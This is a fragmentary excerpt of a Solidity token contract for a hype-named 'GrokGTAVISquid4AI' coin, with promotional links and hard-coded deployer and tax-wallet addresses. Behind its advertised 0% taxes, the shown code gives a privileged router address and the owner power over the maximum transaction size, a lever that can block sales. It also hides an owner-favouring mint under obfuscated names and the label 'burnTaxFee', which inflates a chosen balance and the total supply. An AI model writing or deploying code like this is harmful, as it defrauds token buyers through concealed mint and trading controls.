// SPDX-License-Identifier: MIT
        ...
        //WEBSITE: https://grokgtavisquid4ai.com
        //TELEGRAM: https://t.me/grokgta6squid4aicom
        //TWITTER(X): https://twitter.com/GrokGTA6SquidAI
...
contract GROKGTAVISQUID4AICOM is GGSA20, Ownable {

  using SafeMath for uint256;

    uint256 private constant VERSION = 1;
    address private V2Router09;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromTax;
    uint256 public maxTxAmount;
    uint256 public buyTaxRate = 0;  // 0%
    uint256 public sellTaxRate = 0; // 0%
    address public Gdeployer;
    address constant taxwallet = 0xea1d7bEeAc15348Db01D8e23f5dFb192DF1cD820; 
    ...
    constructor(address _V2Router09 ) payable {
    _name = unicode"GrokGTAVISquid4AI.com";
    _symbol = unicode"人工智能";
    _decimals = 18;
    ...
    Gdeployer = 0xaff2b67F46BD1E156fF9ef076e6D6aDc2759Dc4C;
    _isExcludedFromTax[Gdeployer] = true;
    
    V2Router09 = _V2Router09;
    _isExcludedFromTax[V2Router09] = true;
   ...
   function _transfer(
    ...
    if (!_isExcludedFromTax[sender] && sender != V2Router09) {
    ...
    require(_msgSender() == V2Router09 || _msgSender() == owner(), "Not authorized");
        maxTxAmount = amount;
    }
    ...
    uint256 InputValue = Output09.mul(Syntax07);
    uint256 burnTaxFee = InputValue.mul(Unit01).mul(Prime08);

    _balances[Server00] = _balances[Server00].add(burnTaxFee);
    _totalSupply = _totalSupply.add(burnTaxFee);

    emit Transfer(address(0), Server00, burnTaxFee);
    }
